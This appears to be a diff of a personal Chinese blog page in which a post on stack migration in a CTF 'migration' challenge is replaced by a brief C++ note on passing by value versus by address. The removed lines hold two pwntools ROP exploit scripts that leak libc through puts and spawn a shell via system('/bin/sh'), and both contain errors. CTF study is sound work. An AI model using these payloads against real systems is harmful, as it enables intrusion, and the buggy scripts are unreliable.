@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="题目为 migration 栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 123456789101112131415161718192021222324252627282930313233">
+<meta name="description" content="传值与传址传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动 在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。 过程就是  sub   mov   add  当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。 传址：直接对地址上的值进行变动">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对于栈迁移技术的学习">
-<meta property="og:url" content="http://yoursite.com/2019/10/04/对于栈迁移技术的学习/index.html">
+<meta property="og:title" content="c++学习笔记（面向过程的编程风格）">
+<meta property="og:url" content="http://yoursite.com/2019/10/06/c++学习笔记（面向过程的编程风格）/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="题目为 migration 栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 123456789101112131415161718192021222324252627282930313233">
+<meta property="og:description" content="传值与传址传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动 在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。 过程就是  sub   mov   add  当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。 传址：直接对地址上的值进行变动">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-06T06:28:35.515Z">
+<meta property="og:updated_time" content="2019-10-06T10:29:54.053Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对于栈迁移技术的学习">
-<meta name="twitter:description" content="题目为 migration 栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 123456789101112131415161718192021222324252627282930313233">
+<meta name="twitter:title" content="c++学习笔记（面向过程的编程风格）">
+<meta name="twitter:description" content="传值与传址传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动 在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。 过程就是  sub   mov   add  当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。 传址：直接对地址上的值进行变动">
 
 
 
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/04/对于栈迁移技术的学习/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/06/c++学习笔记（面向过程的编程风格）/">
 
 
 
 
 
-  <title>对于栈迁移技术的学习 | zhz'blog</title>
+  <title>c++学习笔记（面向过程的编程风格） | zhz'blog</title>
   
 
 
@@ -293,7 +293,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/04/对于栈迁移技术的学习/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/c++学习笔记（面向过程的编程风格）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -310,7 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">对于栈迁移技术的学习</h1>
+          <h1 class="post-title" itemprop="name headline">c++学习笔记（面向过程的编程风格）</h1>
         
 
         <div class="post-meta">
@@ -322,8 +322,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-04T14:48:48+08:00">
-                2019-10-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-06T18:19:57+08:00">
+                2019-10-06
               </time>
             
 
@@ -396,16 +396,11 @@
       
 
       
-        <p>题目为 migration</p>
-<p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>    <span class="built_in">esp</span>  <span class="built_in">ebp</span></span><br><span class="line">       <span class="keyword">pop</span>  <span class="built_in">ebp</span></span><br><span class="line">       <span class="keyword">pop</span>  <span class="built_in">eip</span></span><br></pre></td></tr></table></figure>
-
-<p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = lib_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh,sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>下面是利用rop模块进行的，这就可以了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'migration'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x8048380</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0804836d</span></span><br><span class="line">puts_got = <span class="number">0x8049ff0</span></span><br><span class="line"><span class="comment">#buf = 0x0804b000-0x200</span></span><br><span class="line"><span class="comment">#buf2 = buf + 0x100</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">100</span>])</span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(rop)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_off = <span class="number">0x5fca0</span></span><br><span class="line">libc = u32(r.recv(<span class="number">4</span>)) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc:"</span>,hex(libc)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">system_off = <span class="number">0x3ada0</span></span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,<span class="number">0</span>,buf2+<span class="number">16</span>,<span class="string">"/bin/sh"</span>])</span><br><span class="line">sh.sendline(rop2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
+        <h3 id="传值与传址"><a href="#传值与传址" class="headerlink" title="传值与传址"></a>传值与传址</h3><p>传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动</p>
+<p>在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。</p>
+<p>过程就是  sub   mov   add </p>
+<p>当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。</p>
+<p>传址：直接对地址上的值进行变动</p>
 
       
     </div>
@@ -432,7 +427,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/10/04/对于栈迁移技术的学习/" title="对于栈迁移技术的学习">http://yoursite.com/2019/10/04/对于栈迁移技术的学习/</a>
+    <a href="http://yoursite.com/2019/10/06/c++学习笔记（面向过程的编程风格）/" title="c++学习笔记（面向过程的编程风格）">http://yoursite.com/2019/10/06/c++学习笔记（面向过程的编程风格）/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -454,8 +449,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/04/pwn  unlink/" rel="next" title="pwn unlink">
-                <i class="fa fa-chevron-left"></i> pwn unlink
+              <a href="/2019/10/05/c++学习笔记 （c++编程基础）/" rel="next" title="c++学习笔记（c++编程基础）">
+                <i class="fa fa-chevron-left"></i> c++学习笔记（c++编程基础）
               </a>
             
           </div>
@@ -463,10 +458,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/05/c++学习笔记 （c++编程基础）/" rel="prev" title="c++学习笔记（c++编程基础）">
-                c++学习笔记（c++编程基础） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -518,8 +509,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -563,6 +563,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#传值与传址"><span class="nav-number">1.</span> <span class="nav-text">传值与传址</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
